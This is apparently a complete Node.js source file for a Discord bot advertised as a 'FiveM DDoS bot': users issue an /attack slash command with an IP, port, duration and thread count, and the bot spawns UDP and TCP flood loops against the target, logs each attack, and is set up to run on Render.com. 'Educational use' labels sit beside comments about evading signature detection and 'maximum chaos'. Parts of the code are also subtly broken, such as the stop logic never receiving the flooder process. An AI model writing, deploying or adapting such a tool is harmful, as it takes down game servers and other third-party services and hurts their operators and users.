// ============================================================
// FIVEM DDOS BOT – NODE.JS | DISCORD.JS V14 | RENDER-READY
// ============================================================
require('dotenv').config();
const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder, PermissionsBitField } = require('discord.js');
const { spawn } = require('child_process');
const net = require('net');
const dgram = require('dgram');
const fetch = require('node-fetch');

// ---------- GLOBALS ----------
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ]
});

let activeAttacks = new Map(); // key: guildId-userId, value: { process, target, port, duration, startTime }
let attackCounter = 0;
const LOG_CHANNEL = process.env.LOG_CHANNEL_ID;
const OWNER = process.env.OWNER_ID;

// ---------- UTILITY FUNCTIONS ----------
function generatePayload(size) {
  // Random ASCII + binary garbage to evade signature detection
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
  let payload = '';
  for (let i = 0; i < size; i++) {
    payload += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return payload;
}

function getRandomPort() {
  return Math.floor(Math.random() * (65535 - 1024) + 1024);
}

function isValidIP(ip) {
  const ipv4Regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
  return ipv4Regex.test(ip);
}

// ---------- FLOOD ENGINE (MULTI-THREADED VIA CHILD PROCESS) ----------
function launchFlooder(targetIP, targetPort, durationSeconds, packetSize, threads = 10) {
  return new Promise((resolve, reject) => {
    // Spawn a child process to run the flooder – isolates main thread
    const flooder = spawn('node', [
      '-e',
      `
        const net = require('net');
        const dgram = require('dgram');
        const target = '${targetIP}';
        const port = ${targetPort};
        const duration = ${durationSeconds} * 1000;
        const size = ${packetSize};
        const threads = ${threads};

        function generatePayload(s) {
          let p = '';
          for (let i=0; i<s; i++) p += String.fromCharCode(33 + Math.floor(Math.random()*94));
          return p;
        }

        function udpFlood() {
          const sock = dgram.createSocket('udp4');
          const payload = generatePayload(size);
          let start = Date.now();
          let sent = 0;
          while (Date.now() - start < duration) {
            sock.send(payload, 0, payload.length, port, target, (err) => {
              if (err) { /* silent fail */ }
              sent++;
            });
            if (sent % 1000 === 0) {
              // yield to event loop
              setImmediate(() => {});
            }
          }
          sock.close();
        }

        function tcpFlood() {
          const payload = generatePayload(size);
          let start = Date.now();
          let connections = 0;
          while (Date.now() - start < duration) {
            const client = new net.Socket();
            client.connect(port, target, () => {
              client.write(payload);
              connections++;
            });
            client.on('error', () => { /* ignore */ });
            setTimeout(() => { client.destroy(); }, 100);
            if (connections % 500 === 0) setImmediate(() => {});
          }
        }

        // Launch threads (mix of UDP and TCP for maximum chaos)
        for (let i = 0; i < threads; i++) {
          if (i % 2 === 0) {
            setTimeout(udpFlood, i * 10);
          } else {
            setTimeout(tcpFlood, i * 10);
          }
        }

        // Keep process alive for duration + buffer
        setTimeout(() => {
          process.exit(0);
        }, duration + 5000);
      `
    ], { stdio: ['ignore', 'pipe', 'pipe'] });

    let output = '';
    flooder.stdout.on('data', (data) => { output += data.toString(); });
    flooder.stderr.on('data', (data) => { output += data.toString(); });

    flooder.on('close', (code) => {
      resolve({ code, output });
    });

    flooder.on('error', (err) => {
      reject(err);
    });

    // Return the process object so we can kill it later
    return flooder;
  });
}

// ---------- DISCORD BOT LOGIC ----------
client.once('ready', async () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  await registerCommands();
  console.log('✅ Slash commands registered');
});

async function registerCommands() {
  const commands = [
    new SlashCommandBuilder()
      .setName('attack')
      .setDescription('Launch a DDoS attack against a target IP:port (educational use)')
      .addStringOption(option => 
        option.setName('target')
          .setDescription('Target IP address (e.g., 192.168.1.1)')
          .setRequired(true)
      )
      .addIntegerOption(option =>
        option.setName('port')
          .setDescription('Target port (default: 30120 for FiveM)')
          .setRequired(false)
      )
      .addIntegerOption(option =>
        option.setName('duration')
          .setDescription('Duration in seconds (default: 60)')
          .setRequired(false)
      )
      .addIntegerOption(option =>
        option.setName('packetsize')
          .setDescription('Packet size in bytes (default: 1024)')
          .setRequired(false)
      )
      .addIntegerOption(option =>
        option.setName('threads')
          .setDescription('Number of threads (default: 10, max: 50)')
          .setRequired(false)
      ),
    new SlashCommandBuilder()
      .setName('stop')
      .setDescription('Stop all active attacks initiated by you'),
    new SlashCommandBuilder()
      .setName('status')
      .setDescription('Check current attack status'),
    new SlashCommandBuilder()
      .setName('killall')
      .setDescription('[OWNER ONLY] Terminate all ongoing attacks')
  ];

  try {
    const guild = client.guilds.cache.get(process.env.GUILD_ID);
    if (guild) {
      await guild.commands.set(commands);
    } else {
      await client.application.commands.set(commands);
    }
  } catch (err) {
    console.error('Command registration failed:', err);
  }
}

// ---------- COMMAND HANDLERS ----------
client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;

  const { commandName, user, guild } = interaction;

  // --- /attack ---
  if (commandName === 'attack') {
    await interaction.deferReply({ ephemeral: true });

    // Permission check: only allow users with certain roles or owner
    const member = guild.members.cache.get(user.id);
    if (!member.permissions.has(PermissionsBitField.Flags.Administrator) && user.id !== OWNER) {
      return interaction.editReply({ content: '⛔ You need Administrator permissions or be the bot owner to use this command.', ephemeral: true });
    }

    const targetIP = interaction.options.getString('target');
    const targetPort = interaction.options.getInteger('port') || 30120;
    const duration = interaction.options.getInteger('duration') || 60;
    const packetSize = interaction.options.getInteger('packetsize') || 1024;
    const threads = Math.min(interaction.options.getInteger('threads') || 10, 50);

    if (!isValidIP(targetIP)) {
      return interaction.editReply({ content: '❌ Invalid IP address format. Please provide a valid IPv4.', ephemeral: true });
    }

    if (targetPort < 1 || targetPort > 65535) {
      return interaction.editReply({ content: '❌ Port must be between 1 and 65535.', ephemeral: true });
    }

    if (duration < 5 || duration > 600) {
      return interaction.editReply({ content: '❌ Duration must be between 5 and 600 seconds.', ephemeral: true });
    }

    // Check if user already has an active attack
    const attackKey = `${guild.id}-${user.id}`;
    if (activeAttacks.has(attackKey)) {
      return interaction.editReply({ content: '⚠️ You already have an ongoing attack. Use `/stop` to cancel it first.', ephemeral: true });
    }

    // Launch the flooder
    try {
      const flooderProcess = await launchFlooder(targetIP, targetPort, duration, packetSize, threads);
      
      // Store attack details
      activeAttacks.set(attackKey, {
        process: flooderProcess,
        target: targetIP,
        port: targetPort,
        duration: duration,
        startTime: Date.now(),
        threads: threads,
        packetSize: packetSize
      });

      attackCounter++;

      // Build embed for log channel
      const embed = new EmbedBuilder()
        .setTitle('🔥 ATTACK LAUNCHED')
        .setColor(0xFF0000)
        .addFields(
          { name: 'Target', value: `${targetIP}:${targetPort}`, inline: true },
          { name: 'Duration', value: `${duration}s`, inline: true },
          { name: 'Threads', value: `${threads}`, inline: true },
          { name: 'Packet Size', value: `${packetSize} bytes`, inline: true },
          { name: 'Initiated By', value: `<@${user.id}>`, inline: true },
          { name: 'Attack ID', value: `#${attackCounter}`, inline: true }
        )
        .setTimestamp()
        .setFooter({ text: 'Educational stress test – do not use illegally' });

      // Send to log channel
      const logChannel = client.channels.cache.get(LOG_CHANNEL);
      if (logChannel) await logChannel.send({ embeds: [embed] });

      // Reply to user
      await interaction.editReply({
        content: `✅ Attack launched against **${targetIP}:${targetPort}** for **${duration}** seconds with **${threads}** threads. Use \`/stop\` to halt early.`,
        ephemeral: true
      });

      // Auto-expire attack from map after duration + buffer
      setTimeout(() => {
        if (activeAttacks.has(attackKey)) {
          activeAttacks.delete(attackKey);
          const doneEmbed = new EmbedBuilder()
            .setTitle('⏹️ ATTACK COMPLETED')
            .setColor(0x00FF00)
            .addFields(
              { name: 'Target', value: `${targetIP}:${targetPort}`, inline: true },
              { name: 'Duration', value: `${duration}s`, inline: true },
              { name: 'Attack ID', value: `#${attackCounter}`, inline: true }
            )
            .setTimestamp();
          if (logChannel) logChannel.send({ embeds: [doneEmbed] });
        }
      }, duration * 1000 + 3000);

    } catch (err) {
      console.error(err);
      await interaction.editReply({ content: `❌ Failed to launch attack: ${err.message}`, ephemeral: true });
    }
  }

  // --- /stop ---
  else if (commandName === 'stop') {
    await interaction.deferReply({ ephemeral: true });
    const attackKey = `${guild.id}-${user.id}`;
    if (!activeAttacks.has(attackKey)) {
      return interaction.editReply({ content: 'ℹ️ You have no active attacks.', ephemeral: true });
    }

    const attack = activeAttacks.get(attackKey);
    try {
      attack.process.kill('SIGTERM');
      activeAttacks.delete(attackKey);
      await interaction.editReply({ content: `🛑 Attack on ${attack.target}:${attack.port} stopped successfully.`, ephemeral: true });
      const logChannel = client.channels.cache.get(LOG_CHANNEL);
      if (logChannel) {
        await logChannel.send({ content: `🛑 Attack on ${attack.target}:${attack.port} stopped by <@${user.id}>` });
      }
    } catch (err) {
      await interaction.editReply({ content: `❌ Error stopping attack: ${err.message}`, ephemeral: true });
    }
  }

  // --- /status ---
  else if (commandName === 'status') {
    await interaction.deferReply({ ephemeral: true });
    const attackKey = `${guild.id}-${user.id}`;
    if (activeAttacks.has(attackKey)) {
      const attack = activeAttacks.get(attackKey);
      const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
      const remaining = Math.max(attack.duration - elapsed, 0);
      await interaction.editReply({
        content: `📊 **Active Attack**\nTarget: ${attack.target}:${attack.port}\nElapsed: ${elapsed}s\nRemaining: ${remaining}s\nThreads: ${attack.threads}\nPacket Size: ${attack.packetSize} bytes`,
        ephemeral: true
      });
    } else {
      await interaction.editReply({ content: '📊 No active attacks.', ephemeral: true });
    }
  }

  // --- /killall (owner only) ---
  else if (commandName === 'killall') {
    await interaction.deferReply({ ephemeral: true });
    if (user.id !== OWNER) {
      return interaction.editReply({ content: '⛔ Only the bot owner can use this command.', ephemeral: true });
    }

    const count = activeAttacks.size;
    for (const [key, attack] of activeAttacks) {
      try {
        attack.process.kill('SIGKILL');
      } catch (e) { /* ignore */ }
    }
    activeAttacks.clear();
    await interaction.editReply({ content: `☠️ Killed all ${count} active attacks.`, ephemeral: true });
    const logChannel = client.channels.cache.get(LOG_CHANNEL);
    if (logChannel) {
      await logChannel.send({ content: `☠️ All attacks killed by owner <@${user.id}>` });
    }
  }
});

// ---------- RENDER.COM SPECIFIC: KEEP ALIVE ----------
// Since Render uses ephemeral ports, we need to keep the process alive
// We'll set up a simple HTTP server to satisfy Render's health checks
const http = require('http');
const server = http.createServer((req, res) => {
  res.writeHead(200);
  res.end('Bot is alive and ready for action.');
});
server.listen(process.env.PORT || 3000, () => {
  console.log(`🌐 HTTP server listening on port ${process.env.PORT || 3000}`);
});

// ---------- ERROR HANDLING & RECOVERY ----------
process.on('unhandledRejection', (err) => {
  console.error('Unhandled Rejection:', err);
});

process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err);
});

// ---------- LOGIN ----------
client.login(process.env.DISCORD_TOKEN).catch(err => {
  console.error('Login failed:', err);
  process.exit(1);
});
